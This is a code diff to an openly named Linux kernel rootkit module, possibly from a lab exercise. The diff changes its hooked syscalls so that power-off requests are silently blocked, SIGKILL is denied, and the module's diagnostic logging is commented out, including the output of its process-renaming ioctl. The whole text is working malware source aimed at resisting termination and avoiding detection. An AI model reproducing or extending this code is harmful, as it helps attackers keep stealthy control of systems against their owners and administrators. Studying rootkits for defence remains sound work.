@@ -11,6 +11,7 @@
 #include <asm/syscall.h>
 #include <linux/string.h>
 #include <linux/kprobes.h>
+#include <linux/reboot.h>
 
 #include "rootkit.h"
 
@@ -52,15 +53,18 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 //sys_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg)
 long my_reboot(const struct pt_regs *regs)
 {
-	pr_err("intercepting reboot...\n");	
-	return 0;
+	// we omit magic check here
+	if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF)
+		return 0;
+
+	return (*__sys_reboot)(regs);
 }
 
 //sys_kill(pid_t pid, int sig)
 long my_kill(const struct pt_regs *regs)
 {
 	if (regs->regs[1] == SIGKILL) {
-		pr_err("found SIGKILL, deny it\n");	
+		//pr_err("found SIGKILL, deny it\n");	
 		return 0;
 	}
 	return (*__sys_kill)(regs);
@@ -241,12 +245,14 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			goto err_free;
 		}
 
+		/*
 		pr_err("after sanitization:\n");
 		for (i = 0; i < req.len; i++) {
 			pr_err("%zu:\n", i);
 			pr_err("\t%s\n", req.list[i].orig_name);
 			pr_err("\t%s\n", req.list[i].new_name);
 		}
+		*/
 
 		for_each_process(task) {
 			for (i = 0; i < req.len; i++)
